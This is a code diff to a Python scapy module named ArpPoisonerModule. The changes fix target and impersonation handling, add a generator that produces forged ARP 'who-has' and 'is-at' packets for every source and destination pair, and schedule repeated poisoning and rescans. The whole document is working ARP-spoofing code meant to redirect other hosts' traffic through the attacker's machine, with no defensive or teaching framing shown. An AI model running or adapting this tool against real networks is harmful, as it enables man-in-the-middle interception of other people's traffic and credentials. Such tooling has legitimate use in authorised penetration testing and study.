@@ -6,6 +6,7 @@ import scapy.all as scapy
 import threading
 import time
 import logging
+import itertools
 
 logger = logging.getLogger(__name__)
 
@@ -37,10 +38,11 @@ class ArpPoisonerModule(Module):
     ArpPoisonerModule will send out spoofed ARP messages at regular intervals to poison the network.
     It also starts by sending out an arping to all targets to see who is on the network and populate the cache.
     """
-    def __init__(self, arpcache, iface=None, hwaddr=None, target=None, impersonate=None, interval=1):
+    def __init__(self, arpcache, iface=None, hwaddr=None, target=None, impersonate=None, poison_interval=2, ping_interval=30):
         self.arpcache = arpcache
         self.iface = iface
-        self.interval = interval
+        self.poison_interval = poison_interval
+        self.ping_interval = ping_interval
         self.hwaddr = hwaddr
         self.target = target
         self.impersonate = impersonate
@@ -60,43 +62,56 @@ class ArpPoisonerModule(Module):
         # Figure out who we are trying to resolve
         if target is None:
             if self.target is None or self.impersonate is None:
-                pdst = net.ifcidr(self.iface)
+                pdst = net.ifcidr(self.iface).cidr()
             else:
                 # It has to be a list because scapy can be really cool, but also kinda wonky
-                pdst = list(set(self.enumerate(self.target)) | set(self.enumerate(self.target)))
+                pdst = list(set(self.enumerate(self.target)) | set(self.enumerate(self.impersonate)))
         else:
             pdst = target
 
+        psrc = str(net.ifaddr(self.iface))
+
         # Send out an arp "who-has" requests
-        pkts = scapy.Ether(src=self.hwaddr, dst='ff:ff:ff:ff:ff:ff')/scapy.ARP(op='who-has', hwsrc=self.hwaddr, pdst=pdst)
+        pkts = scapy.Ether(src=self.hwaddr, dst='ff:ff:ff:ff:ff:ff')/scapy.ARP(op='who-has', hwsrc=self.hwaddr, psrc=psrc, pdst=pdst)
         scapy.sendp(pkts, iface=self.iface)
+
+    def packets(self, srcs, dsts):
+        for src, dst in itertools.product(srcs, dsts):
+            if src != dst:
+                yield scapy.Ether(src=self.hwaddr, dst=self.arpcache[dst])/scapy.ARP(op='who-has', hwsrc=self.hwaddr, psrc=src, pdst=dst)
+                yield scapy.Ether(src=self.hwaddr, dst=self.arpcache[dst])/scapy.ARP(op='is-at', hwsrc=self.hwaddr, psrc=src, pdst=dst)
+
 
     def arpoison(self, target=None, impersonate=None):
         # Chose the target and impersonation lists
-        impersonate = impersonate or self.impersonate or net.ifcidr(self.iface)
-        target = target or self.target or net.ifcidr(self.iface)
-        ifaddr = str(net.ifaddr(self.iface))
+        impersonate = impersonate or self.impersonate or net.ifcidr(self.iface).cidr()
+        target = target or self.target or net.ifcidr(self.iface).cidr()
 
         # Filter out targets and impersonations not in our ARP cache
         pdst = [ip for ip in self.enumerate(target) if ip in self.arpcache]
         psrc = [ip for ip in self.enumerate(impersonate) if ip in self.arpcache]
 
-        if pdst:
-            # Build the packet list and filter out packets that would be sent to the true ip owner
-            pkts = [scapy.Ether(src=self.hwaddr, dst=self.arpcache[ip])/scapy.ARP(op=['who-has', 'is-at'], hwsrc=self.hwaddr, psrc=psrc, pdst=ip) for ip in pdst]
-            pkts = [p for p in pkts if p.psrc != p.pdst and p.dst != ifaddr]
-
+        if psrc and pdst:
             # Launch the payload
-            scapy.sendp(pkts, iface=self.iface)
+            scapy.sendp(self.packets(psrc, pdst), iface=self.iface)
 
     def run(self):
         if self.hwaddr is None:
             self.hwaddr =  str(net.ifhwaddr(self.iface))
 
-        self.arping()
+        # Poison the network and (re)scan at the specified intervals.
+        next_ping, next_poison = 0, 0
         while not self._stopevent.is_set():
-            self.arpoison()
-            time.sleep(self.interval)
+            now = time.time()
+            if now > next_ping:
+                self.arping()
+                next_ping = now + self.ping_interval
+
+            if now > next_poison:
+                self.arpoison()
+                next_poison = now + self.poison_interval
+
+            time.sleep(min(next_ping - now, next_poison - now))
 
     def start(self, sniffer):
         self._stopevent.clear()
